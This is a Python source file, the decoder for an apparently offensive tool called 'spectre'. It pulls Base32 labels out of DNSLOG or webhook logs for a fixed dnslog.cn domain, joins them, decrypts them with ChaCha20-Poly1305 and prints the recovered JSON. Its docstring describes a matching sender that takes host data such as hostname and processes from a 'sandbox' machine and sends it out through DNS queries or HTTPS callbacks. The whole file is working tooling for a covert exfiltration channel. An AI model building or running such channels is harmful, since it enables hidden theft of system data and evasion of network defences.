#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
spectre 接收端 —— 解析 DNSLOG / webhook 平台的访问日志，还原被外带的明文。

原理（与 Rust 发送端保持一致）：
  沙箱端 采集JSON -> zlib压缩 -> ChaCha20加密(base64(nonce)/base64(ct):...)
          -> 通过 HTTPS POST 全量回连 / Base32切片 DNS 分片外带
  本脚本 从粘贴文本/日志文件提取所有 <label> -> 按顺序拼接 -> Base32解码
         -> 拆出 nonce 与密文 -> ChaCha20 解密 -> 打印 JSON 明文。

用法：
  # 方式1：把平台日志里的一段文本（含 URL 或域名或纯标签，每行可多）粘贴进 stdin
  python decode.py < dump.txt
  # 方式2：直接传文件，支持 .txt/.csv/.json
  python decode.py --file dump.txt
  # 方式3：手动传原始加密串（base64(nonce):base64(ct)），HTTPS 回连/--raw 使用
  python decode.py --raw "base64(nonce):base64(ct)"
  通用参数：
  python decode.py --file dump.txt --key <32字节hex> --reverse --needles "hostname,processes"

依赖：pip install cryptography
"""

import argparse
import base64
import json
import re
import sys
import zlib

from cryptography.hazmat.primitives.ciphers.aead import ChaCha20Poly1305

# 与发送端保持一致
BASE_DOMAIN = "7320io.dnslog.cn"
AAD = b"spectre-v1"
# base32 NOPAD 的字母表（data-encoding BASE32_NOPAD）
B32_ALPHABET = set("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567")
DEMO_KEY = bytes(b"spectre-demo-key-32bytes-!").ljust(32, b"\x00")


def parse_hex_key(s: str) -> bytes:
    s = s.strip()
    if len(s) != 64:
        sys.exit("[!] --key 需 64 位 hex（=32字节）")
    try:
        return bytes.fromhex(s)
    except ValueError:
        sys.exit("[!] --key 不是合法 hex")


def extract_label(line: str) -> str:
    """从一行提取单个 base32 数据标签。只接受包含 BASE_DOMAIN 的 token，
    避免时间戳/来源IP等无关文本被误当成标签。"""
    line = line.strip()
    if not line or BASE_DOMAIN not in line:
        return ""
    chunk = line
    # 完整 URL：base 后面紧跟 /<label>
    if "://" in line:
        after_scheme = line.split("://", 1)[1]
        # 拿 base 之后的路径段
        if "/" in after_scheme:
            chunk = after_scheme.split("/", 1)[1]
        else:
            chunk = ""
    else:
        # 域名形式：去掉 BASE_DOMAIN 及其后缀，取之前内容
        chunk = line.split(BASE_DOMAIN, 1)[0]
    if not chunk:
        return ""
    # 只保留 base32 合法字符（已去除域名，故不会有 token 混入）
    lab = "".join(c for c in chunk if c in B32_ALPHABET)
    return lab


def collect_labels(text: str, reverse: bool) -> list:
    labels = []
    for raw in text.splitlines():
        line = raw.strip()
        if not line or line.startswith("#"):
            continue
        # 一行可能含多个 URL/标签时，按空白拆分后再各自提取
        for token in re.split(r"[\s,;]+", line):
            lab = extract_label(token)
            if lab:
                labels.append(lab)
    if reverse:
        labels.reverse()
    # 去重但保序（防平台重复记录）==》不直接去重，保序去重
    seen, out = set(), []
    for lab in labels:
        if lab not in seen:
            seen.add(lab)
            out.append(lab)
    return out


def decrypt_direct(key: bytes, nonce_b64: str, ct_b64: str) -> str:
    """解密 base64 形式的 nonce 与密文，返回还原文本。"""
    nonce = base64.b64decode(nonce_b64)
    ct = base64.b64decode(ct_b64)
    aead = ChaCha20Poly1305(key)
    try:
        pt = aead.decrypt(nonce, ct, AAD)
    except Exception as e:
        sys.exit(f"[!] 解密失败（密钥不匹配 / AAD 不符 / 数据损坏）：{e}")
    # 发送端先 zlib 压缩再加密，故解密后需解压。
    try:
        pt = zlib.decompress(pt)
    except zlib.error:
        pass
    return pt.decode("utf-8", errors="replace")


def decode_and_decrypt(key: bytes, labels: list) -> str:
    concat = "".join(labels)
    if len(concat) % 8:
        concat += "=" * (8 - len(concat) % 8)
    try:
        b64str = base64.b32decode(concat, casefold=True).decode("utf-8")
    except Exception as e:
        sys.exit(f"[!] Base32 解码失败（标签缺失/顺序错/被截断?）：{e}")
    if ":" not in b64str:
        sys.exit("[!] 解码后的中间串缺少 ':' 分隔（nonce:密文），说明数据不完整")
    nonce_b64, ct_b64 = b64str.split(":", 1)
    return decrypt_direct(key, nonce_b64, ct_b64)


def pretty_print(text: str, needles: list):
    try:
        data = json.loads(text)
    except json.JSONDecodeError:
        print(text)
        return
    if needles:
        print("=== 关键字段 ===")
        for n in needles:
            if n in data:
                print(f"  {n}: {data[n]}")
    print("\n=== 完整 JSON ===")
    print(json.dumps(data, ensure_ascii=False, indent=2))


def main():
    ap = argparse.ArgumentParser(description="spectre 接收端")
    ap.add_argument("--file", help="读取平台日志文件(.txt/.csv/.json)")
    ap.add_argument("--labels", help="直接传入原始标签(空格/换行分隔)")
    ap.add_argument("--raw", help="直接传入 HTTP 回连获取的加密串 (base64:nonce/base64:ct)")
    ap.add_argument("--key", default=None, help="32字节密钥 hex，缺省用演示密钥")
    ap.add_argument("--reverse", action="store_true", help="平台若倒序记录则反转")
    ap.add_argument("--needles", default="", help="逗号分隔的字段名，仅打印关键字段")
    args = ap.parse_args()

    key = parse_hex_key(args.key) if args.key else DEMO_KEY

    if args.raw:
        raw = args.raw.strip()
        if ":" not in raw:
            sys.exit("[!] --raw 需格式 base64(nonce):base64(ct)")
        nonce_b64, ct_b64 = raw.split(":", 1)
        plaintext = decrypt_direct(key, nonce_b64, ct_b64)
        pretty_print(plaintext, [n.strip() for n in args.needles.split(",") if n.strip()])
        return

    if args.labels:
        raw = args.labels
    elif args.file:
        with open(args.file, "r", encoding="utf-8", errors="replace") as f:
            raw = f.read()
    else:
        # 从 stdin 读取
        raw = sys.stdin.read()

    if not raw.strip():
        sys.exit("[!] 输入为空")

    labels = collect_labels(raw, args.reverse)
    if not labels:
        sys.exit("[!] 未从输入中提取到任何数据标签")

    needles = [n.strip() for n in args.needles.split(",") if n.strip()]
    print(f"[+] 提取到 {len(labels)} 片标签")
    plaintext = decode_and_decrypt(key, labels)
    pretty_print(plaintext, needles)


if __name__ == "__main__":
    main()